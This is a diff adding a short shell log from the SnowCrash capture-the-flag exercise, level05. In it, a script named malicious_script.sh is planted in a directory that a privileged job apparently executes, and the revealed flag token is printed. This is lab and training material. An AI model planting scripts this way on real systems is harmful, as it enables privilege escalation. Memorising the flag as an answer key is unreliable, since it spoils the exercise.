@@ -1,0 +1,6 @@
+
+
+level05@SnowCrash:/var/mail$ echo "/bin/getflag > /tmp/flag05" > /opt/openarenaserver/malicious_script.sh
+level05@SnowCrash:/var/mail$ chmod +x /opt/openarenaserver/malicious_script.sh
+level05@SnowCrash:/var/mail$ cat /tmp/flag05
+Check flag.Here is your token : viuaaale9huek52boumoomioc
